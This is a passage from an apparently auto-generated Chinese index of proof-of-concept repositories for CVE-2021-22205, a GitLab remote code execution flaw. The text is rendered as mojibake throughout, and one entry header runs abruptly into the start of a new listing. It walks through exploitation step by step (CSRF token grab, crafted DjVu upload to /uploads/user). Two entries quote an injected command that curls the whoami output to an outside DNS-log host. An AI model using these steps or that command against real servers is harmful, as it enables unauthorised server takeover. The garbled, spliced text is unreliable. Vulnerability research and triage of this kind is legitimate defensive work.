4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

